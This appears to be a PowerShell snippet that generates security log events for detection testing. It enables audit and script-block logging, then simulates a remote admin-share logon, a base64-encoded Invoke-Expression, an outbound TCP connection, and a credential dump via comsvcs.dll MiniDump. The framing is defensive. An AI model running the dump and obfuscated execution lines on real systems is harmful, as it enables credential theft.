# Enable Audit Logs
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
 
# Simulate Malicious Logon Attempt
Invoke-Expression 'net use \\192.168.1.10\C$ /user:hacker "password"'
 
# Malicious PowerShell Script Block Logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
Invoke-Expression '[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("Z2V0LWNvbnRlbnQgc3lzdGVtLnhtbA=="))'
 
# Simulate a Suspicious Network Connection (Sysmon Event ID 3)
$client = New-Object System.Net.Sockets.TcpClient("192.168.1.100", 443)
 
# Attempt Credential Dump (requires privileged access for full effect)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 c:\temp\dump.dmp
